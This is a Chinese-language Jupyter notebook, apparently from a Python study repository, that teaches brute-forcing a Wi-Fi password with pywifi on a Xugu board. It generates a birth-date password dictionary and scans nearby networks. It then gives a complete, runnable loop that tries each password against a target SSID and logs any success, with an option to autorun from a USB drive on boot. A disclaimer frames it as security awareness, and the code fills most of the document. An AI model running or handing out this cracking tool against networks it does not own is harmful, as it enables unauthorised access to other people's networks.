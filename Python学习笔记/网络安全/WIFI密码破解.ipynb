{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Wi-Fi密码破解\n",
    "\n",
    "本案例仅仅用来演示网络安全，提醒每个人都要关心网络安全，请不要用于非法途径。\n",
    "\n",
    "很多人给自己的Wi-Fi设置密码，总是用一些典型的弱密码，如家人的生日日期，12345678之类。这类密码很容易用工具来破解。Python中的pywifi库，就可以用来暴力破解密码。虚谷号可以安装pywifi库，并且用来体验Wi-Fi破解的过程。本案例使用的技术破解速度很慢，在实际应用中的价值并不大。"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 1.安装pywifi\n",
    "\n",
    "用pip安装pywifi库，最新版本为1.1.12。命令如下：\n",
    "\n",
    "pip install pywifi"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 2.生成字典\n",
    "\n",
    "一般的家庭路由器往往使用弱密码，如家庭成员的生日密码。下面这段代码生成1960年到2020年之间的所有日期。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "密码本完成\n"
     ]
    }
   ],
   "source": [
    "import time,datetime\n",
    "t=datetime.datetime(1960,1,1)\n",
    "#生成密码本\n",
    "dic =open('./dic.txt','w')\n",
    "i=0\n",
    "s=\"\"\n",
    "while i<365*60:\n",
    "    t=t + datetime.timedelta(days=1)\n",
    "    i=i + 1\n",
    "    s=s + t.strftime(\"%Y%m%d\") + '\\n'\n",
    "dic.write(s)\n",
    "dic.close()\n",
    "print('密码本完成')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 3.核心代码分析"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[<pywifi.iface.Interface at 0x7f8ef51f28>,\n",
       " <pywifi.iface.Interface at 0x7f8ef69630>]"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 获取本机网卡信息\n",
    "import pywifi\n",
    "wifi = pywifi.PyWiFi()  #创建对象,三个字母大写\n",
    "wififile = pywifi.Profile()\n",
    "ifaces = wifi.interfaces()\n",
    "ifaces"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "p2p-dev-wlan0\n",
      "wlan0\n"
     ]
    }
   ],
   "source": [
    "for i in ifaces:\n",
    "    print(i.name())"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "这个代码是输出本机的所有无线网卡，虚谷号会找到2个（其中一个是虚拟网卡），第二个才是真实的网卡，代码中要使用`wifi.interfaces()[0]`。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[<pywifi.profile.Profile at 0x7f8ef78828>,\n",
       " <pywifi.profile.Profile at 0x7f8ef51a20>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78860>,\n",
       " <pywifi.profile.Profile at 0x7f8ef787f0>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78898>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78908>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78978>,\n",
       " <pywifi.profile.Profile at 0x7f8ef789e8>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78a58>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78a90>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78ac8>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78b00>,\n",
       " <pywifi.profile.Profile at 0x7f8ef78b38>]"
      ]
     },
     "execution_count": 4,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 扫描Wi-Fi，获取所有的ssid列表\n",
    "import time\n",
    "import pywifi\n",
    "wifi = pywifi.PyWiFi()  #创建对象,三个字母大写\n",
    "wififile = pywifi.Profile()\n",
    "ifaces = wifi.interfaces()[1]\n",
    "ifaces.scan()\n",
    "time.sleep(2)\n",
    "aplist = ifaces.scan_results()  #scan的结果\n",
    "aplist"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "aplist中存储的是pywifi的一个对象，可以用dir输出这个对象的所有属性。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "{'akm': [4],\n",
       " 'auth': 0,\n",
       " 'bssid': 'd8:9b:3b:e1:25:cd',\n",
       " 'cipher': 0,\n",
       " 'freq': 2437,\n",
       " 'id': 0,\n",
       " 'key': None,\n",
       " 'signal': -33,\n",
       " 'ssid': '\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00\\\\x00'}"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# 输出这个对象的所有属性\n",
    "a=aplist[0]\n",
    "a.__dict__"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "根据关键词可以“秒懂”，signal是信号，ssid是Wi-Fi信号的名称,akm是加密类型。signal的值越大（负数），说明信号越好。其他的属性，就不一一介绍了。通过一个循环，一次性输出所有的ssid和signal。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 -33\n",
      "jf -30\n",
      "test -40\n",
      "jf -73\n",
      "jf -77\n",
      "CMCC-z2mA -82\n",
      " -78\n",
      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 -85\n",
      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 -31\n",
      "\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00 -91\n",
      "xlz -91\n",
      "TP-LINK_94F1B2 -91\n",
      " -83\n"
     ]
    }
   ],
   "source": [
    "for i in aplist:\n",
    "    print(i.ssid,i.signal)\n",
    "    time.sleep(0.2)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "破解Wi-Fi密码的方法其实很简单，就是从密码本中读出所有可能的密码，一个一个不停地测试连接，如果连接成功，就停止测试，输出密码。\n",
    "\n",
    "核心函数是wifiConnect。参数是Wi-Fi的ssid名称和密码，连接成功返回True，否则返回False。代码中ifaces.status为无线网卡的状态值，IFACE_DISCONNECTED和IFACE_CONNECTED分别为pywifi中预设的const（常量），值分别为0和4。也就是说，status为0表示网络断开，1表示正在连接，4表示连接成功。\n",
    "\n",
    "**注意**：运行这段代码，虚谷号会断开Wi-Fi数秒钟。如果给出的Wi-Fi信息能够正常连接，那么请在“连接成功”下方设置正常的Wi-Fi信息，否则你就连不上虚谷号的pyjuter服务了。当然，按下RST键后，虚谷号会重新连接Wi-Fi，重新启动jupyter服务。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pywifi\n",
    "import time\n",
    "c=pywifi.const # pywifi的常量\n",
    "wifi = pywifi.PyWiFi()\n",
    "ifaces = wifi.interfaces()[1]\n",
    "def wifiConnect(wifiname,wifipassword):\n",
    "    ifaces.disconnect()# 断开连接\n",
    "    time.sleep(0.5)\n",
    "    if ifaces.status() == c.IFACE_DISCONNECTED:\n",
    "        profile = pywifi.Profile() # 创建WiFi连接文件\n",
    "        profile.ssid = wifiname # WiFi的ssid，即wifi的名称\n",
    "        profile.key = wifipassword # WiFi密码\n",
    "        profile.akm.append(c.AKM_TYPE_WPA2PSK) # WiFi的加密类型，现在一般的wifi都是wpa2psk\n",
    "        profile.auth = c.AUTH_ALG_OPEN # 开放网卡\n",
    "        profile.cipher = c.CIPHER_TYPE_CCMP # 加密单元\n",
    "        ifaces.remove_all_network_profiles() # 删除所有的WiFi文件\n",
    "        tep_profile = ifaces.add_network_profile(profile) # 设定新的连接文件\n",
    "        ifaces.connect(tep_profile) # 连接WiFi\n",
    "        time.sleep(3) #连接时间太短，有可能会出现误判\n",
    "        if ifaces.status() == c.IFACE_CONNECTED:\n",
    "            return True\n",
    "        else:\n",
    "            return False\n",
    "r=wifiConnect('test','19600601')\n",
    "if (r==True):\n",
    "    print('连接成功！')\n",
    "else:\n",
    "    print('连接失败！')\n",
    "# 请在这里输入虚谷号正常工作的Wi-Fi信息。\n",
    "wifiConnect('make','12345678')"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## 4.运行完整代码"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "在虚谷号上有多种方式运行下面单元格的代码，推荐如下两种：\n",
    "\n",
    "    1）直接运行。\n",
    "    2）保存为main.py文件，连同生成的“dic.txt”一起复制到U盘到Python目录。开机后将自动执行。\n",
    "\n",
    "运行这段程序后，每测试100个密码，虚谷号会亮一次板载Arduino的LED，代码执行结束后，LED会持续闪烁。如果在13号引脚接上蜂鸣器，则可以听到声音提示。\n",
    "\n",
    "破解成功后，在.py文件所在的文件夹中会看到一个wifi.log文件，记录了破解的过程和结果。代码执行结束后，不管是否破解成功，都会重新连接默认的Wi-Fi，恢复正常工作。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pywifi\n",
    "import time\n",
    "from xugu import Pin #导入xugu库，破解成功或者任务结束后会闪烁LED\n",
    "\n",
    "#闪烁灯\n",
    "def blink(p):\n",
    "    p.write_digital(1) \n",
    "    time.sleep(0.3)\n",
    "    p.write_digital(0) \n",
    "    time.sleep(0.3)\n",
    "\n",
    "#测试连接\n",
    "def wifiConnect(wifiname,wifipassword):\n",
    "    c=pywifi.const # pywifi的常量\n",
    "    ifaces.disconnect()# 断开连接\n",
    "    time.sleep(0.5)\n",
    "    if ifaces.status() == c.IFACE_DISCONNECTED:\n",
    "        profile = pywifi.Profile()# 创建WiFi连接文件\n",
    "        profile.ssid = wifiname# WiFi的ssid，即wifi的名称\n",
    "        profile.key = wifipassword# WiFi密码\n",
    "        profile.akm.append(c.AKM_TYPE_WPA2PSK)# WiFi的加密类型，现在一般的wifi都是wpa2psk\n",
    "        profile.auth = c.AUTH_ALG_OPEN # 开放网卡\n",
    "        profile.cipher = c.CIPHER_TYPE_CCMP# 加密单元\n",
    "        ifaces.remove_all_network_profiles()# 删除所有的WiFi文件\n",
    "        tep_profile = ifaces.add_network_profile(profile)# 设定新的连接文件\n",
    "        ifaces.connect(tep_profile) # 连接WiFi\n",
    "        time.sleep(2.5) #经过测试2.5秒比较稳定\n",
    "        if ifaces.status() == c.IFACE_CONNECTED:\n",
    "            return True\n",
    "        else:\n",
    "            return False\n",
    "\n",
    "\n",
    "#开始破解\n",
    "p = Pin(13, Pin.OUT)\n",
    "wifi = pywifi.PyWiFi()\n",
    "ifaces = wifi.interfaces()[1]\n",
    "print('开始破解，破解成功后虚谷号的LED会快速闪烁。')\n",
    "file = open('dic.txt','r') # 打开密码本\n",
    "log=open('wifi.log','w') # 记录\n",
    "wifi_name='test' # 要破解的Wi-Fi的名称\n",
    "count=0 # 测试次数\n",
    "while True:\n",
    "    wifipwd = file.readline()\n",
    "    try:\n",
    "        bool = wifiConnect(wifi_name,wifipwd)\n",
    "        if bool:\n",
    "            log.write('wifi名称：')\n",
    "            log.write(wifi_name + '\\n')\n",
    "            log.write('wifi密码：')\n",
    "            log.write(wifipwd + '\\n')\n",
    "            break\n",
    "        else:\n",
    "            count=count+1\n",
    "            if (count % 10==0):\n",
    "                tips='已经测试了%d个密码，本次尝试的密码为：%s，状态：密码错误' % (count,wifipwd)\n",
    "                print(tips)\n",
    "                log.write(tips + '\\n')\n",
    "                blink(p)\n",
    "    except:\n",
    "        continue\n",
    "file.close()\n",
    "log.close()\n",
    "\n",
    "# 重新连接Wi-Fi\n",
    "wifiConnect('make','12345678')\n",
    "\n",
    "#持续闪烁提示\n",
    "while 1:\n",
    "    blink(p)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.5.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
